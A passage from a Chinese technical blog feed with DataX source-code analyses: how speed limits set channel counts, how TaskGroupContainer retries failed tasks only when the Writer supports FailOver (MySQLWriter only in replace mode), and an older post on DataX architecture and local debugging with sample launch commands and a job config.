<p>接着做阶梯测试。Channel 从 1、2、4 往上加，吞吐如果还接近线性增长，可以继续；吞吐已经不动而等待时间明显抬升，就停。多出来的并发只会增加连接、队列和事务压力。</p>
<p>速度预算应该按最慢的一端来定。源库稳定能读 45 MB&#x2F;s，目标端长期只能写 28 MB&#x2F;s，DataX 进程本身能跑 60 MB&#x2F;s，任务就应该从 28 MB&#x2F;s 以下开始配。60 MB&#x2F;s 是压测出来的进程能力，不是生产链路的安全速度。</p>
<p>最后再做一次同数据、同时段的对照运行。我要确认 Channel 是否按预期生成、吞吐提升来自哪里，以及源库和目标库有没有用更高的延迟换来这点速度。“这次快了”算不上验收，解释不了的提升通常也复制不了。</p>
<h2 id="留一个结论"><a href="#留一个结论" class="headerlink" title="留一个结论"></a>留一个结论</h2><p>DataX 的速度控制分成启动前和运行中两段。<code>JobContainer</code> 用总预算和单 Channel 预算计算并发，<code>schedule()</code> 再用 Task 数量兜底；任务跑起来以后，Channel 按统计窗口决定休眠，MemoryChannel 则用有界队列传递背压。</p>
<p>因此，<code>speed.byte</code> 不是越大越快。它首先改变的是并发计算，最终速度还受 Task 切分、Reader、Writer 和队列等待影响。排查时沿着这条链路看，比盯着一个参数反复试要可靠得多。</p>
<h2 id="对照源码"><a href="#对照源码" class="headerlink" title="对照源码"></a>对照源码</h2><ul>
<li><a href="https://github.com/alibaba/DataX/blob/30842ca21e910b2a4ebc29eb9647b469f008ed00/core/src/main/java/com/alibaba/datax/core/job/JobContainer.java#L416-L486"><code>JobContainer.adjustChannelNumber()</code>：总速度换算 Channel 数</a></li>
<li><a href="https://github.com/alibaba/DataX/blob/30842ca21e910b2a4ebc29eb9647b469f008ed00/core/src/main/java/com/alibaba/datax/core/job/JobContainer.java#L492-L511"><code>JobContainer.schedule()</code>：Channel 数受 Task 数约束</a></li>
<li><a href="https://github.com/alibaba/DataX/blob/30842ca21e910b2a4ebc29eb9647b469f008ed00/core/src/main/java/com/alibaba/datax/core/transport/channel/Channel.java#L120-L239"><code>Channel.push()</code> 与 <code>statPush()</code>：入队、统计和休眠</a></li>
<li><a href="https://github.com/alibaba/DataX/blob/30842ca21e910b2a4ebc29eb9647b469f008ed00/core/src/main/java/com/alibaba/datax/core/transport/channel/memory/MemoryChannel.java#L60-L125"><code>MemoryChannel</code>：队列容量和两类等待时间</a></li>
<li><a href="https://github.com/alibaba/DataX/blob/30842ca21e910b2a4ebc29eb9647b469f008ed00/core/src/main/conf/core.json#L24-L46"><code>core.json</code>：单 Channel 默认配置</a></li>
</ul>
]]></content>
      <categories>
        <category>数据同步</category>
      </categories>
      <tags>
        <tag>DataX</tag>
        <tag>源码分析</tag>
        <tag>性能调优</tag>
      </tags>
  </entry>
  <entry>
    <title>DataX 任务重试为什么会放大故障：TaskGroupContainer 的重试边界</title>
    <url>//2020/12/19/datax-task-retry-boundary/</url>
    <content><![CDATA[<p>同步任务偶发失败时，加几次自动重试很诱人。网络抖一下能自己恢复，值班的人也少接一条告警。问题是，重试会把整个 Task 再执行一遍。Writer 如果不具备幂等能力，一次短暂故障很可能被放大成重复数据。</p>
<p>DataX 对这件事并非完全没有防护。它没有根据异常类型判断“可恢复”或“不可恢复”，而是把决定权交给 Writer：只有 Writer 明确声明支持 FailOver，<code>TaskGroupContainer</code> 才会重建 Task。</p>
<p>这篇笔记核对的是 2020 年 12 月 17 日的 DataX 提交 <code>5485fb3</code>，距离文章日期两天。先把源码行为说清楚，再讨论调度平台应该补哪一层。</p>
<p class="article-diagram-scroll"><img src="/images/articles/datax-task-retry-state.svg" class="lazyload" data-srcset="/images/articles/datax-task-retry-state.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="DataX Task 失败后的重试状态"></p>
<span id="more"></span>

<h2 id="maxRetryTimes-表示总尝试次数"><a href="#maxRetryTimes-表示总尝试次数" class="headerlink" title="maxRetryTimes 表示总尝试次数"></a><code>maxRetryTimes</code> 表示总尝试次数</h2><p><code>TaskGroupContainer.start()</code> 启动时读取三个 FailOver 参数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">taskMaxRetryTimes</span> <span class="operator">=</span> configuration.getInt(</span><br><span class="line">        <span class="string">&quot;core.container.task.failOver.maxRetryTimes&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="variable">taskRetryIntervalInMsec</span> <span class="operator">=</span> configuration.getLong(</span><br><span class="line">        <span class="string">&quot;core.container.task.failOver.retryIntervalInMsec&quot;</span>, <span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="variable">taskMaxWaitInMsec</span> <span class="operator">=</span> configuration.getLong(</span><br><span class="line">        <span class="string">&quot;core.container.task.failOver.maxWaitInMsec&quot;</span>, <span class="number">60000</span>);</span><br></pre></td></tr></table></figure>

<p>这几个值在当时的 <code>core.json</code> 里没有显式配置，代码默认值分别是 1、10 秒和 60 秒。</p>
<p><code>maxRetryTimes</code> 这个名字容易让人误会。Task 第一次启动时 <code>attemptCount</code> 已经是 1，失败后的判断条件是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">taskExecutor.supportFailOver()</span><br><span class="line">        &amp;&amp; taskExecutor.getAttemptCount() &lt; taskMaxRetryTimes</span><br></pre></td></tr></table></figure>

<p>默认值为 1 时，条件 <code>1 &lt; 1</code> 不成立，一次都不会重试。配置为 3，最多会出现第 1、2、3 次尝试，也就是初次执行加两次重试。我在平台侧暴露这个参数时，会把页面文案写成“最大尝试次数”，否则使用者很容易多算一次。</p>
<h2 id="DataX-不判断异常是否值得重试"><a href="#DataX-不判断异常是否值得重试" class="headerlink" title="DataX 不判断异常是否值得重试"></a>DataX 不判断异常是否值得重试</h2><p>Task 执行失败后，源码没有检查 SQLState、网络异常类型或插件错误码。是否进入重试只有两个条件：尝试次数未到上限，Writer 支持 FailOver。</p>
<p>调用关系是这样的：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">TaskGroupContainer.TaskExecutor.supportFailOver()</span><br><span class="line">  -&gt; WriterRunner.supportFailOver()</span><br><span class="line">    -&gt; Writer.Task.supportFailOver()</span><br></pre></td></tr></table></figure>

<p><code>Writer.Task</code> 的默认实现直接返回 <code>false</code>。插件不主动覆盖，就不会重试。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Task</span> <span class="keyword">extends</span> <span class="title class_">AbstractTaskPlugin</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="type">void</span> <span class="title function_">startWrite</span><span class="params">(RecordReceiver lineReceiver)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">supportFailOver</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这套设计关注的是写入能否安全再做一次，不是故障能否自行恢复。两者有联系，但不是一回事。</p>
<p>比如权限配置错误属于永久故障，等十秒再试不会变好；可如果 Writer 声明支持 FailOver，DataX 仍然会按次数重复尝试。反过来，一次临时网络断开可能很快恢复，但 Writer 无法保证重复写的结果，DataX 就应该失败退出。</p>
<p>我认同这个取舍。同步框架无法只看异常名称就判断前一次写入到底提交了多少。写入语义不确定时，宁可停止，也不要拿自动恢复赌数据正确性。</p>
<h2 id="MySQLWriter-为什么只允许-replace"><a href="#MySQLWriter-为什么只允许-replace" class="headerlink" title="MySQLWriter 为什么只允许 replace"></a>MySQLWriter 为什么只允许 <code>replace</code></h2><p>2020 年这版 <code>MysqlWriter.Task</code> 覆盖了 <code>supportFailOver()</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">supportFailOver</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">writeMode</span> <span class="operator">=</span> writerSliceConfig.getString(Key.WRITE_MODE);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;replace&quot;</span>.equalsIgnoreCase(writeMode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只有 <code>writeMode=replace</code> 返回 <code>true</code>。普通 <code>insert</code> 再执行一次，已提交的部分可能产生重复记录或唯一键冲突；<code>replace</code> 在主键或唯一索引成立时，重复写同一行更接近幂等。</p>
<p>这里有两个边界不能省略。</p>
<p>第一，<code>replace</code> 依赖表上的主键或唯一索引。没有冲突键时，它的行为仍然接近普通插入，重试照样可能增加数据。</p>
<p>第二，MySQL 的 <code>REPLACE</code> 不是更新语句。发生唯一键冲突时，它会删除旧行再插入新行，触发器、自增列和关联逻辑都可能受到影响。任务能重试，只说明插件作者接受这种写入语义，不代表业务表一定适合。</p>
<p>所以我不会为了打开自动重试，把所有任务的 <code>writeMode</code> 机械改成 <code>replace</code>。应该先确认目标表的键，再核对失败重跑是否保持业务结果一致。</p>
<h2 id="失败-Task-是怎样重新进入队列的"><a href="#失败-Task-是怎样重新进入队列的" class="headerlink" title="失败 Task 是怎样重新进入队列的"></a>失败 Task 是怎样重新进入队列的</h2><p>Task 状态变成 <code>FAILED</code> 后，<code>TaskGroupContainer</code> 先把旧 <code>TaskExecutor</code> 放入 <code>taskFailedExecutorMap</code>。符合重试条件时会执行三步操作：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">taskExecutor.shutdown();</span><br><span class="line">containerCommunicator.resetCommunication(taskId);</span><br><span class="line">taskQueue.add(taskConfig);</span><br></pre></td></tr></table></figure>

<p>旧 Reader、Writer 收到 <code>shutdown()</code> 和线程中断，Task 的通信状态被重置，原配置重新放回待运行队列。下一轮扫描到这个 Task 时，<code>attemptCount</code> 加一。</p>
<p>新 Task 不会马上启动。距离失败时间不足 <code>retryIntervalInMsec</code> 时，它继续留在队列里。这个版本采用固定等待，不会随着失败次数指数退避。目标库持续不可用时，多个 Task 可能在相近时间再次发起连接，调大重试次数会延长压力，并不会让恢复更聪明。</p>
<p>还有一个比较稳妥的处理：如果旧 Executor 没有真正退出，DataX 不会立刻启动新的 Reader 和 Writer。它会再次调用 <code>shutdown()</code>；超过 <code>maxWaitInMsec</code> 仍未结束，整个 TaskGroup 以 <code>WAIT_TIME_EXCEED</code> 失败。</p>
<p>这个等待很有必要。旧 Writer 仍在写，新 Writer 又拿着同一个 Task 配置启动，比任务失败更难处理。</p>
<h2 id="Task-重试与-Job-重跑不是一回事"><a href="#Task-重试与-Job-重跑不是一回事" class="headerlink" title="Task 重试与 Job 重跑不是一回事"></a>Task 重试与 Job 重跑不是一回事</h2><p>DataX 这里处理的是 TaskGroup 内单个 Task 的 FailOver。一次 Job 往往被切成多个 Task，已经成功的 Task 不会因为另一个 Task 重试而重新执行。</p>
<p>调度平台上的“失败自动重跑”通常会重新提交整个 DataX Job。两层重试叠在一起后，执行次数很容易失控：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">调度器最多重跑 3 次</span><br><span class="line">× DataX 每个 Task 最多尝试 3 次</span><br><span class="line">= 某个失败切片最多执行 9 次</span><br></pre></td></tr></table></figure>

<p>实际情况还会更复杂。Job 第一次运行时已经成功的切片，在调度器重跑时也会再执行。目标表若采用追加写，重复范围不再只是失败 Task，而可能覆盖整个批次。</p>
<p>我处理这类任务时，会先确定哪一层拥有重试权。DataX Task FailOver 适合插件明确支持幂等的局部故障；调度器 Job 重跑则要依赖批次覆盖、临时表交换或业务主键去重。两层都开可以，但必须把最大执行次数和重复写边界算出来。</p>
<h2 id="怎么判断一次失败该不该重试"><a href="#怎么判断一次失败该不该重试" class="headerlink" title="怎么判断一次失败该不该重试"></a>怎么判断一次失败该不该重试</h2><p>我会依次确认四件事。</p>
<p>先看写入是否幂等。相同 Task 执行两遍，目标端的最终状态是否相同？这里要看真实 DDL、<code>writeMode</code> 和事务边界，不能只看插件名称。</p>
<p>再看错误是否可能自行消失。连接超时、服务端限流、节点切换可以进入候选；SQL 语法、字段类型、权限拒绝和磁盘配额耗尽，应该直接失败并保留现场。DataX 内核没有替我们做这项分类，平台层需要根据插件错误码和底层异常补上。</p>
<p>接着核对退避。固定 10 秒适合短暂闪断，不适合持续故障。上层调度如果还要重跑，至少使用递增间隔，并限制同一数据源的并发恢复数量。</p>
<p>最后检查观测字段。日志里应该能找到 <code>taskGroupId</code>、<code>taskId</code>、<code>attemptCount</code>、失败时间和旧 Executor 是否完成退出。没有这些信息，只看到 Job 最终成功，值班人员根本不知道它中间写了几遍。</p>
<p>重试不是提高成功率的免费开关。DataX 源码真正守住的是 Writer 能否重复执行这一条边界；异常分类、退避策略和整批重跑语义，仍然要由数据平台接住。</p>
<h2 id="对照源码"><a href="#对照源码" class="headerlink" title="对照源码"></a>对照源码</h2><ul>
<li><a href="https://github.com/alibaba/DataX/blob/5485fb328eb03fab5c2164a79e902d344475e27f/core/src/main/java/com/alibaba/datax/core/taskgroup/TaskGroupContainer.java#L93-L241"><code>TaskGroupContainer.start()</code>：读取重试参数并处理失败 Task</a></li>
<li><a href="https://github.com/alibaba/DataX/blob/5485fb328eb03fab5c2164a79e902d344475e27f/core/src/main/java/com/alibaba/datax/core/taskgroup/TaskGroupContainer.java#L536-L565"><code>TaskExecutor.supportFailOver()</code>：能力最终委托给 Writer</a></li>
<li><a href="https://github.com/alibaba/DataX/blob/5485fb328eb03fab5c2164a79e902d344475e27f/common/src/main/java/com/alibaba/datax/common/spi/Writer.java#L34-L39"><code>Writer.Task</code>：默认不支持 FailOver</a></li>
<li><a href="https://github.com/alibaba/DataX/blob/5485fb328eb03fab5c2164a79e902d344475e27f/mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java#L70-L98"><code>MysqlWriter.Task</code>：仅 <code>replace</code> 模式允许 FailOver</a></li>
<li><a href="https://github.com/alibaba/DataX/blob/5485fb328eb03fab5c2164a79e902d344475e27f/core/src/main/java/com/alibaba/datax/core/util/container/CoreConstant.java#L28-L38"><code>CoreConstant</code>：FailOver 参数名称</a></li>
</ul>
]]></content>
      <categories>
        <category>数据同步</category>
      </categories>
      <tags>
        <tag>DataX</tag>
        <tag>任务重试</tag>
        <tag>幂等性</tag>
      </tags>
  </entry>
  <entry>
    <title>数据同步 DATAX 工作原理及源码解读</title>
    <url>//2020/10/22/%E3%80%90%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E3%80%91DATAX%20%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%8F%8A%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/</url>
    <content><![CDATA[<h3 id="DataX-工作原理及源码解读"><a href="#DataX-工作原理及源码解读" class="headerlink" title="DataX 工作原理及源码解读"></a>DataX 工作原理及源码解读</h3><h4 id="背景："><a href="#背景：" class="headerlink" title="背景："></a>背景：</h4><p>   最近在工作中接触到阿里的数据同步工具datax,通过其实现了一些数据源的数据同步功能,虽然在官方文档中了解其工作原理,但是还是对其如何实现的可扩展的架构,和不同数据源之间导入导出的原理比较感兴趣,查看网上的一些介绍并没有深入源码，所以闲暇时间查看了datax的主流程代码,对此做了一下总结。</p>
<h4 id="概述"><a href="#概述" class="headerlink" title="概述:"></a>概述:</h4><p>  该文章主要内容如下:</p>
<ul>
<li>datax 介绍</li>
<li>datax 工作原理</li>
<li>datax 如何本地调试</li>
<li>datax 源码分析</li>
<li>总结</li>
</ul>
<h4 id="一、datax-介绍"><a href="#一、datax-介绍" class="headerlink" title="一、datax 介绍"></a>一、datax 介绍</h4><p>   <strong>github</strong>: <a href="https://github.com/alibaba/DataX/blob/master/introduction.md" target="_blank" rel="noopener">datax</a><br>   DataX 是一个异构数据源离线同步工具，致力于实现包括关系型数据库(MySQL、Oracle等)、HDFS、Hive、ODPS、HBase、FTP等各种异构数据源之间稳定高效的数据同步功能。\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/22.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br>具体内容可以查看官方文档这里就不做多描述。</p>
<h4 id="二、datax-工作原理"><a href="#二、datax-工作原理" class="headerlink" title="二、datax 工作原理"></a>二、datax 工作原理</h4><h5 id="1-Datax核心架构图"><a href="#1-Datax核心架构图" class="headerlink" title="1. Datax核心架构图"></a>1. Datax核心架构图</h5><figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/23.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 2 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br>   上图为官方文档的架构图,主要氛围3个大的模块分别为job、task、taskgroup</p>
<ul>
<li>job：datax 每执行一个同步任务则为一个job</li>
<li>task：datax 底层原理是将一个job,根据<strong>切分策略</strong>拆分为多个task来进行并发执行,task是datax的最小执行单位。<br>例：我要同步mysql一个表的数据到hive,我的切分规则为id,假设一张表有1w条记录，我的并发设置为5,则最总会生成25个task(并发数量*5),每个任务同步400条数据。</li>
<li>taskgroup：datax内部Scheduler模块会将拆分的task进行重组合生成taskgroup,创建对应数量的线程池进行任务数据的同步,同步顺序 Reader—&gt;Channel—&gt;Writer</li>
</ul>
<h5 id="2-Datax框架执行顺序"><a href="#2-Datax框架执行顺序" class="headerlink" title="2. Datax框架执行顺序"></a>2. Datax框架执行顺序</h5><p>在看源码之前需要了解datax的执行顺序才能深入理解其工作原理,下面内容是在官方复制的,已经理解其内容的同学可以选择跳过。\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/24.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 3 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br>上图中，黄色表示Job部分的执行阶段，蓝色表示Task部分的执行阶段，绿色表示框架执行阶段。</p>
<h4 id="三、datax-如何本地调试"><a href="#三、datax-如何本地调试" class="headerlink" title="三、datax 如何本地调试"></a>三、datax 如何本地调试</h4><ol>
<li><p>下载datax源码到本地</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/alibaba/DataX.git</span><br></pre></td></tr></table></figure>
</li>
<li><p>idea 打开项目进行编译</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">clean package assembly:assembly -Dmaven.test.skip=true</span><br></pre></td></tr></table></figure>

<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/1.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 4 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br>3. 获取启动参数<br>   datax的启动命令为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">datax.py  xxx.json</span><br></pre></td></tr></table></figure>

<p>datax.py脚本在 &#x2F;datax-core&#x2F;bin&#x2F;datax.py中\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/2.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 5 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br>我们用编译器打开执行python脚本,代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    printCopyright()</span><br><span class="line">    parser = getOptionParser()</span><br><span class="line">    options, args = parser.parse_args(sys.argv[1:])</span><br><span class="line">    if options.reader is not None and options.writer is not None:</span><br><span class="line">        generateJobConfigTemplate(options.reader,options.writer)</span><br><span class="line">        sys.exit(RET_STATE[&#x27;OK&#x27;])</span><br><span class="line">    if len(args) != 1:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        sys.exit(RET_STATE[&#x27;FAIL&#x27;])</span><br><span class="line">    // 这里生成执行脚本</span><br><span class="line">    startCommand = buildStartCommand(options, args)</span><br><span class="line">    # print startCommand</span><br><span class="line"></span><br><span class="line">    child_process = subprocess.Popen(startCommand, shell=True)</span><br><span class="line">    register_signal()</span><br><span class="line">    (stdout, stderr) = child_process.communicate()</span><br><span class="line"></span><br><span class="line">    sys.exit(child_process.returncode)</span><br></pre></td></tr></table></figure>

<p>进行debug调试,获取执行datax的系统参数如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -server -Xms1g -Xmx1g -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/Users/dengmingrui/temp/DataX/core/src/main/log -Xms1g -Xmx1g -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/Users/dengmingrui/temp/DataX/core/src/main/log -Dloglevel=info -Dfile.encoding=UTF-8 -Dlogback.statusListenerClass=ch.qos.logback.core.status.NopStatusListener -Djava.security.egd=file:///dev/urandom -Ddatax.home=/Users/dengmingrui/temp/DataX/core/src/main -Dlogback.configurationFile=/Users/dengmingrui/temp/DataX/core/src/main/conf/logback.xml -classpath /Users/dengmingrui/temp/DataX/core/src/main/lib/*:.  -Dlog.file.name=grui_temp_datax_json com.alibaba.datax.core.Engine -mode standalone -jobid -1 -job /Users/dengmingrui/temp/datax.json</span><br></pre></td></tr></table></figure>

<p>通过启动参数我们可以知道，datax的主方法在<br>com.alibaba.datax.core.Engine,中并且有3个参数分别是model、jobid、job<br>我们把pyhton 脚本生成的命令加工一下放到idea中进行调试。加工后的命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-Xms1g -Xmx1g -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/Users/dengmingrui/temp/DataX/target/datax/datax/log -Dloglevel=info -Dfile.encoding=UTF-8 -Ddatax.home=/Users/dengmingrui/temp/DataX/target/datax/datax -Dlogback.configurationFile=/Users/dengmingrui/temp/DataX/target/datax/datax/conf/logback.xml -Dlog.file.name=s_datax_job_job_json</span><br></pre></td></tr></table></figure>

<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/3.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 6 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<h4 id="datax-源码分析"><a href="#datax-源码分析" class="headerlink" title="datax 源码分析"></a>datax 源码分析</h4><p>这次例子是将mysql中的数据同步到本地所以我的datax json文件内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;job&quot;: &#123;</span><br><span class="line">    &quot;content&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;reader&quot;: &#123;</span><br><span class="line">          &quot;name&quot;: &quot;mysqlreader&quot;,</span><br><span class="line">          &quot;parameter&quot;: &#123;</span><br><span class="line">            &quot;username&quot;: &quot;xxx&quot;,</span><br><span class="line">            &quot;password&quot;: &quot;xxx&quot;,</span><br><span class="line">            &quot;column&quot;: [</span><br><span class="line">                &quot;xxx&quot;,</span><br><span class="line">                &quot;xxx&quot;,</span><br><span class="line">                &quot;xxx&quot;,</span><br><span class="line">                &quot;xxx&quot;,</span><br><span class="line">                &quot;xxx&quot;,</span><br><span class="line">                &quot;xxx&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;splitPk&quot;: &quot;id&quot;,</span><br><span class="line">            &quot;connection&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;table&quot;: [</span><br><span class="line">                        &quot;xxxx&quot;</span><br><span class="line">                    ],</span><br><span class="line">                    &quot;jdbcUrl&quot;: [</span><br><span class="line">                            &quot;xxxxx&quot;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;writer&quot;: &#123;</span><br><span class="line">          &quot;name&quot;: &quot;txtfilewriter&quot;,</span><br><span class="line">          &quot;parameter&quot;: &#123;</span><br><span class="line">            &quot;path&quot;: &quot;/Users/dengmingrui/temp/data&quot;,</span><br><span class="line">            &quot;fileName&quot;: &quot;test&quot;,</span><br><span class="line">            &quot;writeMode&quot;: &quot;truncate&quot;,</span><br><span class="line">            &quot;dateFormat&quot;: &quot;yyyy-MM-dd&quot;,</span><br><span class="line">            &quot;fieldDelimiter&quot;: &quot;,&quot;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;setting&quot;: &#123;</span><br><span class="line">      &quot;speed&quot;: &#123;</span><br><span class="line">        &quot;channel&quot;: 5</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码debug 直接执行 Engine.entry(args) 方法,具体逻辑如下\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/5.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 8 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<ol>
<li>进行main方法参数提取</li>
<li>将datax的json文件转化成Configuration对象(json文件的内容直接通过这个对象可以获取到对应的属性)</li>
<li>对datax json文件做了校验</li>
<li>执行engine.start(configuration)方法</li>
</ol>
<p><strong>start()方法</strong></p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/6.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 9 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 该方法对datax 的json配置文件做了一些填充</span><br><span class="line">ColumnCast.bind(allConf);</span><br></pre></td></tr></table></figure>

<p>该方法对datax 的json配置文件做了一些填充,填充内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;common&quot;:&#123;</span><br><span class="line">        &quot;column&quot;:&#123;</span><br><span class="line">            &quot;dateFormat&quot;:&quot;yyyy-MM-dd&quot;,</span><br><span class="line">            &quot;datetimeFormat&quot;:&quot;yyyy-MM-dd HH:mm:ss&quot;,</span><br><span class="line">            &quot;encoding&quot;:&quot;utf-8&quot;,</span><br><span class="line">            &quot;extraFormats&quot;:[</span><br><span class="line">                &quot;yyyyMMdd&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;timeFormat&quot;:&quot;HH:mm:ss&quot;,</span><br><span class="line">            &quot;timeZone&quot;:&quot;GMT+8&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;core&quot;:&#123;</span><br><span class="line">        &quot;container&quot;:&#123;</span><br><span class="line">            &quot;job&quot;:&#123;</span><br><span class="line">                &quot;id&quot;:-1,</span><br><span class="line">                &quot;reportInterval&quot;:10000</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;taskGroup&quot;:&#123;</span><br><span class="line">                &quot;channel&quot;:5</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;trace&quot;:&#123;</span><br><span class="line">                &quot;enable&quot;:&quot;false&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;dataXServer&quot;:&#123;</span><br><span class="line">            &quot;address&quot;:&quot;http://localhost:7001/api&quot;,</span><br><span class="line">            &quot;reportDataxLog&quot;:false,</span><br><span class="line">            &quot;reportPerfLog&quot;:false,</span><br><span class="line">            &quot;timeout&quot;:10000</span><br><span 